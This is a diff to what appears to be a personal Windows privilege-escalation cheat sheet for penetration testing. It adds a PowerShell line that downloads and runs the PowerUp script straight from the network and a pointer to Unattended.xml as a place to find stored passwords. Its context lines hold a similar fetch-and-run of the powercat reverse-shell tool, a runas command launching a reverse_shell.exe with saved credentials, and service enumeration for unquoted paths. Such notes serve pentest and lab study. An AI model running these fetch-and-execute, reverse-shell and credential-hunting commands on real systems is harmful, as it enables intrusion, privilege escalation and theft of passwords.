@@ -27,8 +27,9 @@ https://github.com/besimorhino/powercat
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
 ```
 
-
-
+```powershell
+iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') 
+```
 ### Arch before making shells!
 Careful of x64,x32,x86_64 etc funtimes with windows!
 
@@ -279,6 +280,11 @@ runas /savecred /user:admin reverse_shell.exe   query /savedcred
 wmic service get name,displayname,pathname,startmode | Sort
 #NEED A powershell command to find the unquoted path pipe
 sc qc [service]        #  to query binary path service
+```
+
+# Passwords in Unattended.xml
+```
+C:\Windows\Panther\Unattend\Unattended.xml
 ```
 
 # Password Mining Memory
